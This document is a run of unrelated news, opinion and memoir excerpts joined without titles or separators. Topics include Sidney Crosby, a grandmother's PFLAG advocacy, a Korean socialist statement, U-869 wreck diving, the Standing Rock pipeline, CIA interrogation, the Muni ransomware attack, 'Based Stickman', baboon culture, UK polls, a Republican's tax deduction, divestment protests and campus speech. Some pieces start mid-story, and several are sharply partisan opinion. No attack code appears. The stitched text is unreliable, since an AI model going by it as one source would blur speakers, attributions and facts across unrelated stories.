In 2009, when President Barack Obama welcomed the Stanley Cup champion Pittsburgh Penguins to the White House, he made it a point to congratulate the youngest captain ever to win the Cup, 21-year-old Sidney Crosby. Toward the end of the ceremony, Obama got a big laugh when he threw a little shade Crosby's way, remarking, "Sidney must be really fast because there's some big hockey players -- and he's not one of them."
A casual fan, Obama did not realize that Crosby had not merely withstood pounding from bigger players but gave as good as he got. It's a major part of his game. During Canada's intrasquad scrimmage before the 2005 World Junior Championship, Crosby, 5-foot-10 at the time, and the much larger Dion Phaneuf -- 6-foot-3 and 25 pounds heavier -- got into a physical confrontation that grew so heated that the coaches had to cancel the rest of that day's practice.

My 81-year-old mother has been an advocate for equality for as long as I can remember, so when my son Jason first told me that he's gay, I had absolutely no qualms about how my parents would react. In fact, Mom and I had had the "do you think Jace is...?" conversation some years earlier. It remains the briefest conversation I've ever had with my mother.
"Do you think Jason is...?" she'd asked.
"Gay?" I'd said it for her. "And perfect? Yes. And his dad and I love him. And Jace'll tell us when he figures it out."
"Well, when he does, tell him we love him too."
Jason's announcement at age 15 was met with hugs and high fives and a mini pride parade in our living room. Our family and friends showered him with love, reveling in the good news that this sweet child was embracing an honest, happy, and sunlit life.
Jace noticed that his elderly grandparents were among his most vocal supporters. He knew that their joy for him was real, and it meant the world to him.
For Christmas that year I gave Mom a silver PFLAG pin. It had a simple, lovely design: a triangle intersecting a heart, like the world's best Venn diagram. She loved what it stood for and wore it everywhere -- even to church. Especially to church.
The first time she wore the pin, someone asked her about it. She called me from Florida to admit, "I wasn't sure what to say."
"How about, 'It's the symbol for PFLAG -- Parents, Friends and Families of Lesbians and Gays. I wear it because my grandson Jason, whom I adore, is gay.'"
I could tell that that made her nervous. "I'm really just supposed to tell people that Jason is, you know...." This time I waited for her, but she whispered it: "Gay."
"It's not a bad word, Mom," I said. "You can say it aloud."
"I said it aloud," she argued.
"Nope," I said. "You said it the way some people say 'cancer,' like if they say it too loudly, they might catch it."
Mom was affronted. "I did not say it that way!"
"Yeah, you did. But you're not the only one who whispers it. A lot of people do that."
I'd recently had lunch with a woman who'd done the exact same thing when talking about an adored friend from college: "He's... gay." The word had been barely voiced, and she'd leaned way in to say it. It had struck me as odd because I knew that she's an ally.
As I recounted this story to my mom, I realized that whispering the word "gay" is a learned behavior from a time when being closeted was the norm, when a loved one's safety depended on secrecy and silence. But times had changed, and the implication that being gay is something shameful, something to be hidden, had to stop.
Mom was upset. "I didn't realize I was doing that!"
"You're not a bad person," I quickly reassured her. "You just learned, somewhere, to say it that way, and now you've got to learn not to do that. Jason's not hiding, not from anyone. You don't need to worry that someone will overhear you. In fact, you should want the whole world to hear how much you love your grandson."
"I do," she said.
"Then you have to remember that things are getting better because of the courage of people like Jace who speak up and say, 'I'm gay,'" I told her. "As straight allies we have to speak up too. So when people ask you about your pin, you smile and look them straight in the eye, and in round, clear tones you tell them about PFLAG and say, 'My grandson Jason is gay, and I love him very much.' And you never, ever whisper when you say 'gay.' Never again."
"I won't," she promised, completely on board my mission-train.
"Say it," I said.
"What?" She laughed. "Right now?"
"It takes practice to break a habit. 'My grandson is gay, and I love him very much.' Just like that elocution scene in Singing in the Rain. 'Round tones, round tones!'" I imitated the posh accent of Lina Lamont's beleaguered instructor.
My mom laughed again. "My grandson is gay, and I love him very much."
"Louder!" I morphed into a drill sergeant.
"My grandson is gay, and I love him very much," Mom shouted back at me over the phone, and we laughed together.
"Perfect," I said. "And then you go on, and you tell them all about Jace, how he's doing in school, his current acting project, how much you love his boyfriend, then segue into news about your other grandchildren, and maybe they'll see that Jason's no different from Melanie or Jack or Marlise."
"He is no different from Melanie or Jack or Marlise," she said, indignant.
A few days later Mom called to report: "Someone asked about my pin, and I did what you said! And her mouth dropped open in shock! So I kept going, and I talked about Jace, then about Jack and Marlise, and I talked and talked until the glazed look left her eyes, and I think maybe she got it!" She laughed. "That was fun. I can't wait until next Sunday."
Go, Mom!
Fast-forward to this past year, when Mom -- as usual -- volunteered to work for Equality Florida at the Harvey Milk Festival. I wandered off to explore, and when I came back I found my dad sitting alone behind the table.
"Where's Mom?" I asked.
Smiling, Dad pointed out into the crowd.
I turned, and there was my 80-something mother, holding a clipboard and preaching the importance of joining Equality Florida to a bemused group of men.

South Korean President Park Geun-hye is scheduled to address a joint session of Congress on May 8 as part of a U.S.-South Korean summit taking place over the coming days in Washington, D.C. In late April, the Workers Solidarity Student Group --the student section of South Korea's International Socialist Tendency, Workers Solidarity All Together--issued this statement about Park's upcoming visit.
AMID THE continuing rise of military tensions on the Korean peninsula, South Korea's new president, Park Geun-hye, will make her first visit to the U.S. since her inauguration in late February, for a U.S.-South Korean summit.
During her visit, she is likely to discuss strengthening the U.S.-South Korea military alliance. "President Park's visit underscores the importance of the U.S.-South Korea alliance as a linchpin of peace and security on the Korean peninsula and in the Asia Pacific region," according to a White House statement. South Korea's Blue House similarly stated that the visit is "an important opportunity to take the broad strategic alliance [of the U.S. and South Korea] to new heights."
But in plain language, this means that the U.S. and its South Korean partner--the main forces responsible the crisis on the Korean peninsula in the first place--will be getting together to add fuel to the fire. While South Korean right-wingers are excited by the use of the term "linchpin," the end result will be the further entanglement of South Korea in the instability of East Asia.
South Korean President Park Geun-hye
As socialists, we oppose all nuclear weapons, and we reject North Korea's bellicose behavior, including its development of nuclear weapons. North Korea's nuclear ambitions don't contribute to peace on the Korean peninsula. However, North Korea's provocations should be viewed as the result--not the cause--of the current crisis.
In fact, it has been the U.S.-South Korea alliance of the past 20-plus years that has threatened peace on the Korean peninsula. And it's the U.S., the world's most heavily armed military power, and South Korea, which spends more on its military each year than North Korea's entire GDP, that should be held accountable for the current situation.
The recent increase in U.S. aggression is the crucial context for understanding the current crisis. The "Key Resolve" military training exercises that began in March were much larger than those in previous years and were designed to demonstrate the U.S. capacity to attack North Korea with its state-of-the-art offensive weapons.
In the last two months, the U.S. mobilized a nuclear submarine, B-52 bombers, B-2 Stealth bombers and F-22 Stealth fighters on the Korean peninsula, displaying their ability to use nuclear weapons to incinerate North Korea whenever they please. At the same time, U.S. officials preach about the "denuclearization of the Korean peninsula" and "a nuclear-free world" with nauseating hypocrisy.
The Obama administration's "pivot to Asia" to confront what it considers to be its chief global competitor, China, also helps to explain the dark clouds gathering over the Korean peninsula. Between 2009 and 2011, the number of U.S. troops in South Korea increased from roughly 26,000 to 37,000 while in Japan they jumped from 41,000 to 87,000.
Using the pretext of North Korea's "nuclear arsenal," the U.S. has also upgraded its East Asian missile defenses, deploying 50 percent of its missile interceptors on the West Coast, while sending Aegis destroyers equipped with missile defense systems to waters off the Korean peninsula. The U.S. also plans to deploy its Terminal High Altitude Area Defense (THAAD) system in Guam.
The Park Geun-hye administration has also exacerbated the crisis on the Korean peninsula. President Park has agreed to a "combined counter-provocation plan" with the U.S., preemptively granting the U.S. the power to intervene in any national conflict on the Korean peninsula. She has also approved an order to "counter aggressively from the start, without any political consideration" in the event of a military confrontation with North Korea.
IT IS in this context--amid threats and displays of military force against North Korea--that Park Geun-hye visits the U.S.
Some observers may expect the summit to extend a message of reconciliation to North Korea. But the U.S. and South Korean governments' proposal of conditional "dialogue" is hypocritical. For the last 20 years, the harsh sanctions against North Korea imposed by the U.S. and South Korea provoked North Korea's nuclear threats, not to mention the provocative military exercises and saber-rattling more recently. And in any case, such invitations to "dialogue" have in the past been fraught with the potential of greater conflict rather than the beginning of peace.
The U.S. also hopes to use the summit to make the case for greater trilateral cooperation between South Korea, Japan and the U.S.--again using the pretext of threats from China and North Korea. "U.S. officials have played a prominent role in encouraging better relations between the governments of South Korean President Park Geun-hye and Japanese Prime Minister Shinzo Abe," according to an early May report in the Wall Street Journal.
Furthermore, the U.S. government is also likely to push for South Korea's adoption of the Trans-Pacific Partnership (a free-trade agreement aimed at restraining the increase of China's economic power in Asia while defending U.S. interests in the region), its introduction of various weapons systems, and an increase in South Korea's share of joint defense costs paid to the U.S. But these policies only serve U.S. interests, while victimizing South Korean workers and citizens. This money should not be spent on weapons, but on the welfare of the population.
We must oppose the U.S. and South Korean governments' discussion of any plan to "strengthen" the U.S.-South Korea military alliance while ratcheting up threats against North Korea. This will only worsen the crisis on the Korean peninsula. All progressive students who yearn for peace on the Korean peninsula should stand together in protest of Park Geun-hye's visit to the U.S.

Over the next six years, a small team of divers explored the wreckage. Their mission: to figure out which U-boat this was and who these men were. The diving was extremely deep (230 feet) and hazardous, and sadly three of the divers died while investigating the U-boat. Despite these losses, my partner John Chatterton and I continued to dive to the limits of the current scuba technology, even after other divers had quit. Finally, in 1997, a team effort by John Chatterton, John Yurga, Pat Rooney and I discovered the evidence that conclusively identified the submarine as U-869.
For most divers, this was the end; the wreckage had been identified and history rewritten. But for me it was only half the story. I began meeting with families of the crew, and visiting their hometowns. They shared their memories and photographs with me, and I began to understand who the men of U-869 were and what their lives had been like. The details of the discovery and identification of the U-boat were documented in a two hour NOVA program, "Hitler's Lost Sub", and in a new book"Shadow Divers" by Robert Kurson.
North Dakota Commissioner: Standing Rock Sioux Sat Out The State Process
Protests over the North Dakota Access Pipeline continue. The head of the state Public Service Commission says that despite invitations, the tribe did not participate in its 11-month permit process.
RENEE MONTAGNE, HOST:
The protest camp in Cannonball, N.D., continues to draw demonstrators against a pipeline they say threatens the water supply and sacred sites of the nearby Standing Rock Sioux tribe. Last week, we heard from tribal chairman David Archambault II, and he looked back at treaties the tribe signed over 150 years ago.
(SOUNDBITE OF ARCHIVED BROADCAST)
DAVE ARCHAMBAULT II: What happened was that the federal government entered in a contract with our tribal nations, the Great Sioux Nation. They identified lands that we agreed to because we knew that there are sacred sites there.
MONTAGNE: One question looming over this controversy is just how much the tribe was consulted before pipeline construction was allowed to proceed on those lands just outside the reservation. To find out more, we reached Julie Fedorchak. She's chair of the commission that permitted the North Dakota Access Pipeline project. Good morning.
JULIE FEDORCHAK: Good morning.
MONTAGNE: You held - the North Dakota Public Service Commission held 30 hours of public hearings before the pipeline was approved. You didn't - in all these 30 hours, you didn't hear from members of the Standing Rock Sioux. But did you consult with them or attempt to get them to be part of these public hearings?
FEDORCHAK: That is true. The Standing Rock tribe did not participate in our public hearings or, quite honestly, at any point throughout our 13-month review process. Here's the situation, though, we notified the tribes. We had a personal call go out to the tribes urging them to participate, and we had a hearing 45 minutes from Cannonball.
MONTAGNE: Cannonball, the area where the protests are, right.
FEDORCHAK: Correct. And they didn't attend, nor did they proceed to provide us with any additional information after the fact about what their concerns are. Meanwhile, there are hundreds of other people who did participate in our process, so we had a lot of different issues we were working through on this pipeline throughout that 13-month process, including careful scrutiny of the river crossings, including careful examination of the cultural resources and consultation with our historic preservation officers. So we had a lot of concerns we were dealing with, among them was not concerns expressed by the Standing Rock tribe.
MONTAGNE: Do you know for sure that the tribal chairman, David Archambault, was notified of this in those 13 months?
FEDORCHAK: His office was notified, yes.
MONTAGNE: When you say you looked into cultural resources, were they Native American cultural resources or they were general cultural resources as defined by the state?
FEDORCHAK: The cultural resources we look at are all of the above. The entire route of the pipeline was examined on foot by certified archaeologists. They identified more than 500 different cultural resources that needed to be protected, and the pipeline route was altered 140 times to avoid cultural resources. So those include Native American resources, but they also include other historic artifacts.
MONTAGNE: The tribe having established that it wants to be treated as the nation that it is, you know, legally, does that suggest, you know, that it shouldn't be subjected to state or local entities?
FEDORCHAK: Well, you know, that's one way that the tribe can look at this. And I think in this case they chose to engage with the federal agencies and express their concerns through that process. That's perfectly appropriate. We have no issues with that at all. And I have great respect for their sovereignty.
I think where we could have had some productive conversations is in some of their concerns, and we could have talked about how the state was looking at the cultural resources, how the state was looking at, you know, the water quality issues and what kind of questions we were asking to ensure that those are being protected.
And so I think it could have been beneficial to have them involved on the process at the state level. And they do engage in the state level on things on a regular basis. The tribes are all in communication with state government officials at various levels throughout our legislative process. And that's because we're living and working in communities right next to each other, and we have all the same interests at heart.
MONTAGNE: Julie Fedorchak is the chair of the North Dakota Public Service Commission, which reviewed the Dakota Access Pipeline before permitting the project. Thank you very much for talking with us.
FEDORCHAK: Thank you, Renee.

"We don't torture people," former CIA director George Tenet told Scott Pelley in 2007, and today Tenet is again defending the agency's use of "enhanced interrogation techniques" after the release of a Senate Intelligence Committee report.
The Senate report details the CIA's use of interrogation methods including waterboarding, sleep deprivation, and death threats. Here's what Tenet told Scott about these techniques back in 2007:
George Tenet: You know, the image that's been portrayed is we sat around the campfire and said, 'Oh, boy, now we go get to torture people.' We don't torture people. Let me say that again to you, we don't torture people. OK? So... Scott Pelley: Come on, George. George Tenet: We don't torture people. Scott Pelley: Khalid Sheikh Mohammed? George Tenet: We don't torture people. Scott Pelley: Waterboarding? George Tenet: We do not. I don't talk about techniques...
Today's Senate report states that Mohammed was waterboarded more than a hundred times and subjected to a "series of near drowning."
The report also found the coercive methods to be ineffective in obtaining reliable information, a point that Tenet and other former CIA leaders rebutted today in a Wall Street Journal op-ed.
The CIA's program has "saved thousands of lives," the op-ed said. "A powerful example of the interrogation program's importance is the information obtained from Abu Zubaydah, a senior al Qaeda operative, and from Khalid Sheikh Muhammed... We are convinced that both would not have talked absent the interrogation program."
Ali Soufan in 2011: Enhanced interrogation is ineffective
However, according to former FBI agent Ali Soufan, who had taken part in the interrogation of Abu Zubaydah before the use of waterboarding and other harsh "enhanced interrogation" techniques, valuable information was provided as a result of non-violent questioning.
In an interview with Lara Logan in 2011, Soufan said his questioning led the al Qaeda operative to identify Khalid Sheikh Mohammed as the mastermind of the 9/11 attacks.
"Zubaydah did not stop talking," Soufan told Lara. "Introducing the techniques made him stop talking."
Soufan further argued that enhanced interrogation techniques are ineffective -- the same claim made by the newly released Senate report -- because torture is what terrorists are trained to expect in Middle Eastern prisons.
"If you look at this from an American perspective, you will say, 'Wow, that's torture.' But really that's like saying, 'Hello' in some jail in the Middle East," Soufan told Lara. "Abu Zubaydah was waterboarded 83 times; Khalid Sheikh Mohammed, 183 times. What does that tell you? Did that tell you the technique is working?"
Jose Rodriguez in 2012: What the CIA did was legal
Another accusation in the Senate report suggests that more prisoners were subjected to waterboarding than the CIA previously acknowledged. However, according to a 2012 interview on 60 Minutes with Jose Rodriguez, the head of CIA's Counterterrorism Center, the CIA was within legal bounds.
Just to be sure, Rodriguez told Lesley Stahl that he got his superiors, right up to President George W. Bush, to sign off on a set of interrogation techniques, including waterboarding.
Jose Rodriguez: We needed to get everybody in government to put their big boy pants on and provide the authorities that we needed. Lesley Stahl: Their big boy pants on-- Jose Rodriguez: Big boy pants. Let me tell you, I had had a lot of experience in the agency where we had been left to hold the bag. And I was not about to let that happen for the people that work for me. Lesley Stahl: There wasn't going to be any deniability on this one? Jose Rodriguez: There was not going to be any deniability. And I tell you something. In August of 2002, I felt I had all the authorities that I needed, all the approvals that I needed. The atmosphere in the country was different. Everybody wanted us to save American lives.
The authorities came from the Justice Department in an opinion -- later dubbed one of the torture memos -- that detailed what was permissible. Jose Rodriguez: We went to the border of legality. We went to the border but that was within legal bounds.
Rodriguez said that not only did the CIA have rules for waterboarding, but they also had to receive permission from CIA headquarters "every time" they engaged in the practice.
Rodriguez echoed some of these arguments in a Washington Post op-ed that was published before the Senate report's release.
"There's great hypocrisy in politicians' criticism of the CIA's interrogation program," Rodriguez wrote in the op-ed. "We did what we were asked to do, we did what we were assured was legal, and we know our actions were effective. Our reward, a decade later, is to hear some of these same politicians expressing outrage for what was done and, even worse, mischaracterizing the actions taken and understating the successes achieved."
Workers in the transportation sector are among the most vulnerable to phishing emails and the ransomware attack on San Francisco's light rail system over the Thanksgiving weekend showed the impact cybercriminals can have on municipal transportation systems.
In the attack that took down computers at the San Francisco Municipal Transportation Agency over the weekend no firewalls were breached — a worker invited the hackers in.
It takes just one employee to click on a malicious link or email attachment to infect a computer, which if networked to other machines can quickly spread the virus. Ransomware is on track to be a $1 billion cybercriminal business in 2016, the FBI has said.
It was found in 97 percent of phishing emails as of September 2016, according to a report from cybersecurity firm PhishMe.
Kyle Chapman emerged as a stick-wielding hero for white nationalists after the March 4 clash in Berkeley between the president's supporters and counterprotesters.
Images and video of Chapman wearing a respirator, shin guards and goggles, and holding a stick and a shield with an American flag sticker, circulated on the Internet.
The stick he appears to strike a counterprotester with earned him the nicknames Based Stickman and Alt Knight — and fawning praise from white supremacists who turned his battlefield exploits into propaganda memes.
Now, the stick that brought Chapman, 41, fame could get him locked away for almost a decade.
On Wednesday, the Alameda County district attorney charged him with a felony count of possessing a lead-filled stick.
Chapman, who lives in Daly City, could face up to eight years in state prison because of a previous violent felony of committing a robbery in Texas.
His arraignment on the stick charge is scheduled for Aug. 25 — two days before a planned rally — again at Berkeley's Martin Luther King Jr. Civic Center Park, the same location as the March 4 clash. This time, it's being hailed as the “Battle of Berkeley 3.”
I interviewed Chapman on Aug. 14 — two days before he was charged — about the deadly violence in Charlottesville, Va.
I wanted to know what he thought of the upcoming Bay Area rallies.
I wanted to know if Chapman supported white supremacists.
“I've already spoken about this,” Chapman bristled. “I don't play the game where I have to sit there and condemn over and over again. I'm not going to buy into that.”
He told me he's not racist, because he has an Asian wife. That has caused some of the people who celebrated him to condemn him on Internet forums such as Stormfront, an online support group for aggrieved white supremacists.
Chapman added that he lost followers when he previously condemned hate groups.
“I lost 40 percent of my supporters when I came out and did a post,” he said. “I said, ‘Look, you guys need to stop it with the racism, stop it with the violence.' I'm not about that. I want to bring all people together.”
And yes, at a rally in late April to support Ann Coulter's hate speech at UC Berkeley, I watched as Chapman pushed back a horde of right-wing soldiers who mistook Berkeley High School students leaving school as their enemy.
Still, Chapman's actions have shown him aligned with white supremacists. At the April 15 melee in Berkeley, Chapman engaged counterprotesters alongside Nathan Damigo, the founder of the white nationalist group Identity Evropa.
I pushed for clarity: Does he stand by white supremacists?
“I've already condemned it, and that's all I have to do,” Chapman said. “I don't owe you an explanation when I've already given the explanation.”
During our 30-minute conversation, Chapman pinned the blame for the altercations in Berkeley, Charlottesville and elsewhere on the police for, he said, refusing to intervene as masked antifascists and Black Lives Matter advocates attacked demonstrators.
Chapman, who didn't respond to my request for a second interview, railed against the charge on Twitter, calling it “bogus.” He wrote that he was “ready to go to jail for this movement.”
That's cool, but if convicted, that's not what he'd be facing jail for.
Based Stickman would be facing jail for wielding a stick as a weapon.

Nasty, brutish, and short--Thomas Hobbes's famous description of life without government could as easily be applied to baboons. The primates are famous for their bad manners. However, a troop of baboons in Kenya has recently changed its ways. Researchers suggest that the relatively peaceable behavior is a type of culture that's passed on to newcomers to the troop.
Baboon culture is rife with violence. Males fight over females, food, resting spots, and sometimes for no apparent reason. The most serious altercations are usually between baboons of close rank; but baboons low on the totem pole get bullied all the time by higher-ups looking for an ego boost.
Now it appears that one troop has found a better way. Robert Sapolsky, a primatologist at Stanford University in California, observed a troop of savanna baboons, dubbed Forest Troop, from the late 1970s until 1986, when an outbreak of bovine tuberculosis killed off the most aggressive males in the group. After the deaths of so many of the members, Sapolsky abandoned his study and stayed away for 10 years.
In the 13 April PLoS Biology, Sapolsky and his wife and colleague Lisa Share describe the dramatic changes they found when they returned. Members sat closer together and groomed each other more. The dominance hierarchy remained--Number Two still scrapped with Numbers One and Three as in a normal troop--but the higher-ranking baboons didn't vent their anger on subordinates. And that's apparently improved life for lowlier baboons; they don't have the classic markers of chronic stress--such as elevated levels of stress hormones--found in their peers in other troops. The most remarkable observation, however, was that the troop had apparently maintained the peace despite a complete turnover in the male population. Normally aggressive male adolescent baboons leave their native troop and slowly work into a new one; Forest Troop had somehow managed to assimilate these surly newcomers without losing its peaceful culture.
Sapolsky and Share are still unsure how the culture is being passed on, but they suspect that it has to do with the observed friendly attitude of the female baboons towards newcomer males. "Sapolsky's research seems to show that the female baboons have 'seen the light,' " and realized that life is better with peaceful males, says Frans de Waal, a primatologist at Emory University in Atlanta. But how the females might calm the waters is still unknown.

ComRes have released what they say is their final poll before the European elections on Thursday. Topline figures are CON 20%, LAB 27%, LDEM 7%, UKIP 33%, GRN 6%. The lead for UKIP is far more modest than the eleven points in their weekend poll, but is still pretty robust. The Conservatives remain in third place, the Lib Dems and Greens continue to battle for fourth place. Tabs here.
A lot of the apparent difference between different European polls is down to different treatment of turnout. ComRes have a very stark turnout filter, taking only those people who say they are 10/10 certain to vote. YouGov has a very liberal approach, including everyone who gives a voting intention (though they often tighten it up for final call polls); ICM weight by turnout, the effect of which is sort of a mid-way between the two extremes.
If you look at the tables, we can work out what the polls would have shown using different methods, letting us compare like-to-like. So, if all three pollsters who've reported in the last couple of days only took those respondents who said they were 10/10 certain to vote the figures would be:
ComRes – CON 20%, LAB 27%, LDEM 7%, UKIP 33%, GRN 6%
ICM – CON 21%, LAB 30%, LDEM 7%, UKIP 29%, OTH 14%
YouGov – CON 21%, LAB 26%, LDEM 8%, UKIP 29%, GRN 10%
But if all three respondents included the answers of all respondents giving an intention to vote the figures would be:
ComRes – CON 21%, LAB 30%, LDEM 8%, UKIP 27%, GRN 7%
ICM – CON 26%, LAB 29%, LDEM 7%, UKIP 24%, GRN 6%
YouGov – CON 23%, LAB 27%, LDEM 9%, UKIP 26%, GRN 9%
As you can see, it doesn't explain all the difference (ICM. for example, would have Labour leading even with a strict turnout filter), but it does reduce the contrasts a bit. A softer turnout filter tends to help Labour, a strict one tends to help UKIP.
UPDATE: Two more Westminster voting intention polls tonight – the monthly telephone ComRes poll for the Indy has topline figures of CON 30%(nc), LAB 35%(-1), LDEM 8%(-1), UKIP 14%(+2). The daily YouGov poll for the Sun meanwhile has topline figures of CON 33%, LAB 37%, LDEM 9%, UKIP 11%. YouGov's Sun poll also asked European voting intention, with topline European figures of CON 21%, LAB 28%, LDEM 10%, UKIP 24%, GRN 12%.
Gabriel Gomez, the Republican candidate to fill John Kerry's vacated Senate seat, is another rich Massachusetts Republican with a tax problem. See, Gomez has a $281,500 income tax deduction lurking in his past that the IRS has deemed as one of its “Dirty Dozen tax scams."
Gomez took the deduction in 2005, claiming it as a donation to the National Architectural Trust. Gomez pledged to the Trust that he would not change the facade of his historic, 112-year-old Cohasset home. That's known as an historical easement, essentially handing over the historical facade of his home to the Trust, a concession worth a great deal of money—$281,500. So where does the scam part come in? Gomez's house is within the Cohasset Common Historic District. The bylaws within that district already prevent homeowners in historic homes from making any changes to the exterior of their homes. He signed a pledge that gave him $281,500 to agree not to do something that he was already forbidden from doing. One tax attorney agrees with the IRS that this is a scam.
One specialist in conservation easement law, Scott Knott, a tax partner in The Ferraro Law Firm in Washington, D.C., said that if easements mandated by local laws are already in place, homeowners have nothing to claim as a tax deduction. “The key is the valuation of the easement and if there is already a restriction on the property, the value is not diminished by the easement,'' said Knott. “The value of any easement that has the same restriction already in place is zero.''
“It is very discouraging to find yet another example of snake oil salesmen misusing tax-exempt status and abusing the tax laws intended to encourage charitable giving, all for the purpose of making a fast buck,'' Grassley, then chairman of the Committee on Finance, said in a December 2004 press release.
The Justice Department filed a complaint against the Trust in 2011, charging that it "marketed its preservation easement program with claims that IRS rules allow for charitable deductions of between 10 to 15 percent of the property value" when the IRS had no such rules. A federal court barred the Trust from making that claim in a 2011 ruling. Here's what one of Gomez's would-be future colleagues, Sen. Chuck Grassley, had to say about this scam back 2004, about the time Gomez was taking the deduction.But what's another snake oil salesman in the Republican Senate caucus? He'd fit right in. But this whole story begs the question, are all Massachusetts Republicans assholes?

Students at Melbourne University have quite literally laid bare their demands that the institution divest from fossil fuels, after activists at the University of New South Wales spent the night camped out in the Vice Chancellor's building.
The actions come as part of a wave of student protests sweeping campuses around the country. Activists say they've been demanding full divestment for years, but made little progress cleaning up endowments.
This morning, students at Melbourne University unveiled an innovative clarion call, suggesting it's time the school's more than $1 billion endowment “stripped its dirty fossil fuel investments”.
Yesterday, students at the University of Queensland occupied the Vice Chancellory well into the night, and left satisfied with a “marathon negotiation”. At the University of New South Wales, the student activists never left. After staging a sit-in at 10am, they rolled out their sleeping bags because the Vice Chancellor cancelled a scheduled meeting.
“The Vice-President of UNSW conveyed to us that we needed to guarantee we would leave the space at 5pm in order for them to follow through with the meeting,” said Breana Macpherson-Rice, one of the student activists.
“We pushed for the meeting plan to go ahead as before, at 4pm, with the opportunity to discuss with the group after whether we felt it appropriate to leave the space,” she said.
“He then told us that the University is not open to negotiating about divestment, and that furthermore the University is concerned about losing face if we do come to an agreement because it sends a message to others that ‘you can just occupy and get your demands met'.”
She said freedom of information request has revealed that the University of New South Wales holds $50 million in fossil fuel equities. The University did not address questions from New Matilda about its exposure to fossil fuels, but the Vice Chancellor is understood to have circulated a message to the University community.
“UNSW encourages staff and students to discuss, debate and express their views in a respectful, considered and lawful manner [and]it is precisely for that reason that the University will not adopt a political stance or a campaigning position,” Vice Chancellor Professor Ian Jacobs said.
He said University authorities had been “looking forward to a considered discussion” about the prospect of fossil fuel divestment, but the decision to occupy a building “crossed the boundary of acceptable expression of views and the meeting could not proceed under those circumstances”.
Professor Jacobs said the University is “working in many ways to facilitate moves to a fossil fuel-free future.” The pace of change, however, has been dismissed by student activists as too slow. They have also found political support from State Greens MP Jeremy Buckingham, who has joined them on campus.
A snap rally is planned for 1pm today.
Macpherson-Rice said those occupying the VC's building are also backed by a further group of 120 students and staff who have “pledged to take bold action”. The students are again seeking a meeting with University Executives.
“I think they weren't taking us seriously earlier, and are rethinking that now. We are looking for outcomes,” Macpherson-Rice said.
Divestment advocates at the University of Queensland had more luck negotiating with University Executives, claiming victory late yesterday after a similar occupation of the Vice Chancellory. Activists took to Facebook to outline the outcomes they'd secured.
The week's escalating actions are part of a coordinated campaign being carried out under the banner ‘flood the campus', which is supported by the climate advocacy group 350.org.
Other Universities involved include the Australian National University and the University of Sydney – which have already made partial divestment commitments – and the Queensland University of Technology and Monash University.
As Dr Vivienne Waller wrote in New Matilda last week, the University of Swinburne is also in the process of seeking an investment fund that can provide a fossil free portfolio.
Across this range of campuses, University Staff have expressed widespread support for students' activism around divestment. The Deputy Director of the Melbourne Sustainable Society Institute, Professor John Wiseman said “rapid divestment from fossil fuels is a crucial step on the pathway to a safe climate future”.
“Divestment from fossil fuels is therefore an urgent ethical and financial responsibility for all Australian investors and institutions – including universities,” he said.
The divestment movement has grown rapidly over the last three years. It seeks to undermine the financial security and social license of fossil fuel companies, and is modelled on similar campaigns against tobacco.
At the United Nations climate conference in Paris last year advocates for divestment, including the President of the Rockafella Brothers Fund, revealed that funds representing $3.4 trillion had committed to some form of divestment.
Gosh, protecting controversial free speech from violent protests is expensive. Wouldn't it be easier for colleges to just not let any of that stuff happen? Who wants another Kent State?
That is, with no exaggeration, the attitude expressed by Sen. Dianne Feinstein (D-Calif.) at a Senate hearing this week on free speech on college campuses.
The hearing came just a day after the Supreme Court ruled unanimously that the First Amendment is so important to American culture that the federal government cannot simply reject trademarks on the basis of offensiveness. Feinstein, by contrast, expressed bafflement at the argument that universities shouldn't succumb to the heckler's veto and to the idea that publicly funded colleges should have to host invited speakers "no matter how radical, offensive, biased, prejudiced, fascist the program is."
There's a reason Feinstein appears on Reason's list of "enemies of freedom."
Ultimately, Feinstein's objection to protecting controversial speech is that of the bureaucrat disguised as the concerned nanny. When people intent on violence show up at protests, other people can get hurt. But colleges have limited resources, she argues—so why should campus police be expected to be able to handle protests if they get seriously out of hand?
"You don't think we learned a lesson from Kent State way back when?" she asked at one point, a fascinating reply that illustrates so much about her mind-set. Feinstein's argument seems to be that the killing of four college students by members of the National Guard would have been prevented if the government hadn't allowed the protests in the first place.
Fortunately, lovers of liberty were well-represented on the panel by UCLA law professor Eugene Volokh, who patiently explained that, yes, publicly funded colleges are expected to make sure the civil liberties of the students on their campus are protected appropriately by law enforcement. "One important job of the government is to prevent violence, and to prevent violence without suppressing free speech," he said in response.
There is an odd mind-set out there—one not confined to any particular ideology—that thinks it's some sort of distraction for law enforcement officials to spend their time protecting protesters from violence or standing along parade routes to make sure people come to no harm. These people have their priorities backwards. Protecting people who are expressing their First Amendment rights is what the police are for. The distractions are arresting people for drugs and citing people for not wearing seatbelts.
Similarly, people like Feinstein complain about the costs of protecting liberty as though colleges haven't been undergoing a dramatic increase in administrative bloat. The answer isn't more money from the government. The answer is better spending priorities.
Over at Hot Air, John Sexton says he's surprised to see Feinstein support submission to the heckler's veto. He shouldn't be. Feinstein is actively pro-censorship toward anything she perceives as potentially contributing to violence, including imaginary guns in video games.
Ken "Popehat" White, who recently wrote an excellent explainer for the Los Angeles Times detailing how and why "hate speech" is protected speech, took note of the Supreme Court decisions this week and the overall trend of judicial decisions that bolster the First Amendment. But he also worries what it means for the future if we culturally abandon free speech values:
The Supreme Court is upholding the black letter of liberty, but are Americans upholding its spirit? When college students, encouraged by professors and administrators, believe that they have a right to be free of offense, no. When Americans hunger to "open up" libel laws or jail flag burners, no. When our attitude towards the hecker's veto becomes "let's do it to them because they did it to us," no. Not only is speech practically impaired, but in the long term the cultural norms necessary to sustain good Supreme Court precedent are eroded.
After giving White space to explain why hate speech is legally protected, the Los Angeles Times gave the sociologist and legal scholar Laura Beth Nielsen an opportunity to argue that hate speech should be restricted. The crux of her argument is that hateful speech disproportionately affects the disenfranchised and causes actual measurable harms.
Here is what is especially wrongheaded about Nielsen's op-ed: She repeatedly notes how government's speech restrictions have historically protected the powerful and influential. Yet she somehow does not realize that this is an argument against granting the government the authority to define and restrain hate speech.
So she complains that Congress passed a law to prevent the Westboro Baptist Church from protesting military funerals but never did anything to stop the church from protesting the funerals of people who died of AIDS. She denounces anti-panhandling laws, saying they were enacted to protect the interests of businesses that don't want them around. (She doesn't mention that the courts do in fact frequently strike these laws down as unconstitutional.) It's true: The government is more likely to restrict speech on your behalf if you have more political influence. If the government adds "hate speech" to its rationales for cracking down, do you really think the outcome will be any different?
